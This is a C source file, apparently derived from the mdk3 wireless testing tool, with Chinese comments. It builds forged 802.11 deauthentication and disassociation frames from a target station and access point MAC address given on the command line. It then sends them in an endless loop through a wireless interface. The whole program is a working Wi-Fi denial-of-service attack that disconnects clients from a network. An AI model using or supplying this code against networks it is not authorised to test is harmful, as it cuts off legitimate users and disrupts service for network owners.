#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/time.h>

#include "pcap.h"
#include "manufactor.h"
#include "osdep/osdep.h"

#define ETH_MAC_LEN 6
#define	MAX_PACKET_LENGTH 4096

uchar pkt[MAX_PACKET_LENGTH];
uchar mac_src[ETH_MAC_LEN] = "\x00\x00\x00\x00\x00\x00";
uchar mac_dest[ETH_MAC_LEN] = "\x00\x00\x00\x00\x00\x00";
int state = 0;
uchar *mac_sa = NULL;
uchar *mac_ta = NULL;

  

static struct wif *_wi_in, *_wi_out;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

} dev;

struct pckt
{
	uchar *data;
	int len;
} pckt;

int pps2usec(int pps)
{
// Very basic routine to convert desired packet rate to µs
// µs values were measured with rt2570 device
// Should use /dev/rtc like in aireplay

    int usec;
    int ppc = 1000000;

    if (pps>15) ppc=950000;
    if (pps>35) ppc=800000;
    if (pps>75) ppc=730000;
    if (pps>125)ppc=714000;

    usec = ppc / pps;

    return usec;
}


char hex2char (char byte1, char byte2)
{
// Very simple routine to convert hexadecimal input into a byte
	char rv;

	if (byte1 == '0') { rv = 0; }
	if (byte1 == '1') { rv = 16; }
	if (byte1 == '2') { rv = 32; }
	if (byte1 == '3') { rv = 48; }
	if (byte1 == '4') { rv = 64; }
	if (byte1 == '5') { rv = 80; }
	if (byte1 == '6') { rv = 96; }
	if (byte1 == '7') { rv = 112; }
	if (byte1 == '8') { rv = 128; }
	if (byte1 == '9') { rv = 144; }
	if (byte1 == 'A' || byte1 == 'a') { rv = 160; }
	if (byte1 == 'B' || byte1 == 'b') { rv = 176; }
	if (byte1 == 'C' || byte1 == 'c') { rv = 192; }
	if (byte1 == 'D' || byte1 == 'd') { rv = 208; }
	if (byte1 == 'E' || byte1 == 'e') { rv = 224; }
	if (byte1 == 'F' || byte1 == 'f') { rv = 240; }

	if (byte2 == '0') { rv += 0; }
	if (byte2 == '1') { rv += 1; }
	if (byte2 == '2') { rv += 2; }
	if (byte2 == '3') { rv += 3; }
	if (byte2 == '4') { rv += 4; }
	if (byte2 == '5') { rv += 5; }
	if (byte2 == '6') { rv += 6; }
	if (byte2 == '7') { rv += 7; }
	if (byte2 == '8') { rv += 8; }
	if (byte2 == '9') { rv += 9; }
	if (byte2 == 'A' || byte2 == 'a') { rv += 10; }
	if (byte2 == 'B' || byte2 == 'b') { rv += 11; }
	if (byte2 == 'C' || byte2 == 'c') { rv += 12; }
	if (byte2 == 'D' || byte2 == 'd') { rv += 13; }
	if (byte2 == 'E' || byte2 == 'e') { rv += 14; }
	if (byte2 == 'F' || byte2 == 'f') { rv += 15; }

	return rv;
}

uchar *parse_mac(char *input,int kind)
{
// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB

    uchar tmp[12] = "000000000000";
    int t;

    if (input[2] == ':') {
	memcpy(tmp   , input   , 2);
	memcpy(tmp+2 , input+3 , 2);
	memcpy(tmp+4 , input+6 , 2);
	memcpy(tmp+6 , input+9 , 2);
	memcpy(tmp+8 , input+12 , 2);
	memcpy(tmp+10, input+15 , 2);
    } else {
	memcpy(tmp, input, 12);
    }

    for (t=0; t<ETH_MAC_LEN; t++)
    {
	if(kind == 0)
	{
		mac_src[t] = hex2char(tmp[2*t], tmp[2*t+1]);
	}
	else
	{
		mac_dest[t] = hex2char(tmp[2*t], tmp[2*t+1]);
	}
	
    }
	if(kind == 0)
	{
		return mac_src;
	}
	else
	{
		return mac_dest;
	}
 
}

struct pckt create_deauth_frame(uchar *mac_sr, uchar *mac_da, uchar *mac_bssid,int disassoc)
{
	
	//构造deauth帧
        struct pckt retn;           //DEST              //SRC
        char *hdr = "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\xf4\x8e\x92\x3e\x09\xe3"
		 //BSSID             //SEQ  //Reason:unspec
		"\xd4\xee\x07\x48\x37\xee\x70\x6a\x01\x00";

        memcpy(pkt, hdr, 25);
	if (disassoc) pkt[0] = '\xa0';

        memcpy(pkt+4, mac_da, ETH_MAC_LEN);
	
        memcpy(pkt+10,mac_sr, ETH_MAC_LEN);
        memcpy(pkt+16,mac_bssid, ETH_MAC_LEN);

        retn.len = 26;
        retn.data = pkt;

        return retn;
}

struct pckt amok_machine()
{
    // FSM for multi-way deauthing
    static time_t t_prev = 0;

    switch (state) {
	case 0:
	    newone:
	    state = 1;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);
	case 1:
	    state = 2;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 0);
	case 2:
	    state = 3;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 1);
	case 3:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 0);
	}

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
}


int send_packet(uchar *buf, size_t count)
{
	struct wif *wi = _wi_out; /* XXX globals suck */
	if (wi_write(wi, buf, count, NULL) == -1) {
		switch (errno) {
		case EAGAIN:
		case ENOBUFS:
			usleep(10000);
			return 0; /* XXX not sure I like this... -sorbo */
		}

		perror("wi_write()");
		return -1;
	}

	return 0;
}



int mdk_parser(int argc, char *argv[])
{
	struct pckt frm;	//数据包伪造
	int random_mac = 1;     //用随机mac地址还是指定mac地址
	int nb_sent = 0, nb_sent_ps = 0; //数据包计数

	int pps = 120;

	/*获取输入的mac地址*/
	mac_sa = (uchar *) parse_mac(argv[2],0);

	mac_ta = (uchar *) parse_mac(argv[3],1);
	
	
	while(1)
	{
		/*伪造数据包*/
		frm = amok_machine();

		/*发送数据包*/
		if(frm.len < 10)
		printf("数据包太小啦\n");
		send_packet(frm.data, frm.len);
	}
	
	return 0;
	
}


int main(int argc,char *argv[])
{
	if(geteuid() != 0)
	{
		printf("用户级别这么低也想发包？→_→\n");
		return 1;
	}

	/*开启无线网卡接口，并设置为输出端口*/	
	_wi_out = wi_open(argv[1]);
	dev.fd_out = wi_fd(_wi_out);
	dev.arptype_in = dev.arptype_out;
	setuid( getuid() );
	
	int retval = mdk_parser(argc, argv);
	
	return retval;
}
	
	

	
	

    

    




